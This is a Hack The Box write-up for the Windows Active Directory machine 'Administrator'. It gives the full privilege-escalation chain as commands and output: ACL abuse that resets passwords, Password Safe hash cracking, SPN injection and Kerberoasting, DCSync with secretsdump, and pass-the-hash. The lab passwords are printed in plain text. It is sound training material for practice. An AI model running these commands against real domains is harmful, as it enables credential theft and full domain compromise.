---
layout: post
title: "Hack The Box: Administrator"
author: blackhawk0x
date: 2026-10-22
categories: [htb, active-directory, windows]
tags: [BloodHound, FTP, Password Safe, Kerberoasting, Active Directory]
---


# HTB Administrator

## Overview

**Target:** Administrator  
**Platform:** Hack The Box  
**Operating System:** Windows  
**Domain:** `administrator.htb`  
**Starting Credentials:** `olivia : ichliebedich`

Administrator is a Grey Box Active Directory machine. We are given initial credentials for Olivia, allowing us to authenticate to the domain and begin enumerating Active Directory.


## 1. Initial Enumeration

Start with an Nmap scan to identify exposed services.

```
sudo nmap -sC -sV 10.129.8.62 --min-rate 1000
```

The important results are:

|Port|Service|Significance|
|---|---|---|
|21|FTP|File access and potential credential-dependent resources|
|53|DNS|Domain name resolution|
|88|Kerberos|Active Directory authentication|
|135|MSRPC|Windows RPC|
|139, 445|NetBIOS/SMB|Windows networking and file sharing|
|389|LDAP|Active Directory queries|
|464|Kerberos password service|Password operations|
|3268|LDAP Global Catalog|Forest-wide directory searches|
|5985|WinRM|Remote Windows management|

The LDAP service identifies the domain as `administrator.htb`. The host is a Windows domain controller, making Active Directory enumeration the primary focus.

We also have initial credentials:

```
Username: Olivia
Password: ichliebedich
```

## 2. Gaining a Remote Session

Use Evil-WinRM to authenticate with the supplied credentials.

```
evil-winrm -i 10.129.8.62 -u olivia -p 'ichliebedich'
```

Once connected, transfer and execute SharpHound to collect Active Directory information.

```
.\SharpHound.exe
```

Download the resulting ZIP archive to Kali:

```
download .\20261022104836_BloodHound.zip
```

Import the archive into BloodHound and inspect Olivia's outbound object-control relationships.

![BloodHound showing the service account's outbound privilege relationship](/assets/images/administrator_olivia_to_michael.png)

The graph reveals that Olivia has `GenericAll` over Michael's user object.

This is our first opportunity for privilege escalation.

---

## 3. Olivia → Michael: Abusing GenericAll

### Understanding GenericAll

`GenericAll` represents broad control over an AD object. When applied to a user object, it can allow an attacker to modify attributes and perform operations such as resetting the user's password, subject to the object's security configuration.

Because Olivia has `GenericAll` over Michael, we can reset Michael's password and authenticate as him.

Use BloodyAD:

```
bloodyad -H administrator.htb \
  -u olivia -p 'ichliebedich' \
  set password michael 'password'
```

Expected result:

```
[+] Password changed successfully!
```

We now have credentials for Michael:

```
Username: michael
Password: password
```

The password shown here is the value used in the lab commands. In a real environment, a password reset should use a strong, unique value.

---

## 4. Michael → Benjamin: ForceChangePassword

Further inspection of BloodHound reveals that Michael has `ForceChangePassword` rights over Benjamin.

![BloodHound showing the account's outbound privilege relationship](/assets/images/administrator_michael_to_benjamin.png)

This permission allows Michael to reset Benjamin's password without knowing Benjamin's existing password.

Run:

```
bloodyad -H administrator.htb \
  -u michael -p 'password' \
  set password benjamin 'password'
```

Expected result:

```
[+] Password changed successfully!
```

We now have a second account:

```
Username: benjamin
Password: password
```

This is a straightforward example of ACL chaining: Olivia controls Michael, and Michael controls Benjamin. Neither relationship needs to grant domain-wide administrative privileges on its own.

---

## 5. Benjamin → Password Safe Database

The Nmap scan revealed FTP on port 21. Authenticate using Benjamin's credentials:

```
ftp 10.129.8.62
```

At the prompts, enter:

```
Name: benjamin
Password: password
```

List the files:

```
ftp> ls
```

The server exposes:

```
Backup.psafe3
```

Download the file:

```
ftp> binary
ftp> get Backup.psafe3
```

**Why binary mode?** `Backup.psafe3` is a binary Password Safe database. Using FTP's default ASCII mode can modify line endings or otherwise corrupt a transferred file. Binary mode preserves the original bytes.

### Extracting the password hash

Password Safe protects its database with a master password. We can extract the database's password-verification material for offline cracking with John the Ripper.

```
pwsafe2john Backup.psafe3 > pwsafe.hash
```

The resulting hash begins with a structure similar to:

```
Backu:$pwsafe$*3*...
```

The extracted value is not the plaintext password. It is data that a password-cracking tool can use to verify candidate passwords.

### Cracking the master password

Run John against the RockYou wordlist:

```
john pwsafe.hash \
  --wordlist=/usr/share/wordlists/rockyou.txt
```

John recovers master password

We now have the master password needed to open the Password Safe database.

### Inspecting the database

Open `Backup.psafe3` in a compatible Password Safe client and enter the recovered master password.

![passsafe locker image](/assets/images/administrator_passsafe.png)
Inspect the saved entries for additional credentials.

---

## 6. Emily → Ethan: Making the Account Kerberoastable

After recovering Emily's credentials, return to BloodHound and inspect her object-control relationships.

![BloodHound showing the account's outbound privilege relationship](/assets/images/administrator_emily_to_ethan.png)

Emily has write permission over Ethan's account. This enables modification of attributes on Ethan's user object, including the `servicePrincipalName` attribute in this lab.

An account with an SPN can be targeted for Kerberoasting when the relevant conditions are met. Normally, an SPN identifies a service associated with an account. If an account lacks an SPN, an attacker with sufficient write permissions may be able to assign one and then request a service ticket for that account.

Set an SPN on Ethan:

```
bloodyad -H administrator.htb \
  -u emily -p '<REDACTED>' \
  set object ethan servicePrincipalName \
  -v 'hackthebox/ethan.account'
```

Expected output:

```
[+] ethan's servicePrincipalName has been updated
```

The SPN `hackthebox/ethan.account` is a chosen service identifier. Its purpose here is to associate an SPN with Ethan so that a service ticket can be requested for the account.

**Important:** This technique depends on Emily's actual write permissions over Ethan's object and the domain accepting the attribute change. It is not a universal requirement to create a new SPN for every Kerberoasting attack.

---

## 7. Kerberoasting Ethan

With an SPN configured, request Kerberos service tickets using Impacket's `GetUserSPNs`.

```
impacket-GetUserSPNs administrator.htb/emily -request
```

Enter Emily's password when prompted.

The output identifies Ethan:

```
ServicePrincipalName      Name
------------------------  ----
hackthebox/ethan.account  ethan
```

Impacket returns a TGS hash in `$krb5tgs$23$...` format.

This is a Kerberos 5 TGS-REP etype 23 ticket hash, which is compatible with Hashcat mode `13100`.

Save the complete hash to `hash.txt`, then run:

```
hashcat -m 13100 hash.txt \
  /usr/share/wordlists/rockyou.txt
```


We now have Ethan's credentials:

```
Username: ethan
Password: <REDACTED>
```

### Why the attack works

Kerberoasting does not require the attacker to know the service account's password. A domain user can request a service ticket for an account with an SPN, and the ticket contains material that can be attacked offline.

The security impact depends heavily on the account's password strength. A weak password allows an attacker to recover the account secret without repeatedly guessing passwords against the domain controller.

In this case, the password is recovered and the next step is to inspect Ethan's effective privileges.

---

## 8. Ethan → Domain Compromise: DCSync

BloodHound reveals that Ethan has replication-related rights over the `administrator.htb` domain, including the DCSync capability.
![BloodHound showing the account's outbound privilege relationship](/assets/images/administrator_ethan_to_administrator.png)

DCSync abuses Active Directory replication permissions to request password data from a domain controller through directory replication protocols. It does not require reading the `NTDS.dit` file directly from disk.

The relevant rights commonly include:

- `DS-Replication-Get-Changes`
    
- `DS-Replication-Get-Changes-All`
    

Depending on the domain and operation, additional replication rights may also appear in the graph.

The critical issue is that Ethan has sufficient replication permissions to retrieve sensitive credential material for the domain's Administrator account.

### Dump the Administrator credentials

Use Impacket's `secretsdump` and request only the Administrator account:

```
impacket-secretsdump \
  administrator.htb/ethan:limpbizkit@10.129.8.62 \
  -just-dc-user administrator \
  -dc-ip 10.129.8.62
```

The output includes:

```
Administrator:500:<REDACTED>:<REDACTED>:::
```


Ethan's replication rights allow us to retrieve the Administrator's credential material directly, avoiding the need to crack the Administrator's password.

---

## 9. Pass the Hash with Evil-WinRM

Instead of cracking the recovered NT hash, use it to authenticate with Evil-WinRM.

```
evil-winrm -i 10.129.8.62 \
  -u administrator \
  -H <REDACTED>
```

The `-H` option supplies the NT hash for pass-the-hash authentication.

Once authenticated, navigate to the Administrator Desktop:

```
cd C:\Users\Administrator\Desktop
ls
```

The directory contains:

```
root.txt
```

Retrieve the flag:

```
cat root.txt
```

This completes the machine.

---

## Attack Chain Summary

|Stage|Technique|Result|
|---|---|---|
|1|Initial credentials|Remote session as Olivia|
|2|`GenericAll` ACL abuse|Reset Michael's password|
|3|`ForceChangePassword`|Reset Benjamin's password|
|4|FTP enumeration|Download `Backup.psafe3`|
|5|Offline password cracking|Recover Password Safe master password|
|6|Write permission over Ethan|Add an SPN|
|7|Kerberoasting|Recover Ethan's password|
|8|DCSync|Retrieve Administrator's NT hash|
|9|Pass the hash|Authenticate as Administrator|
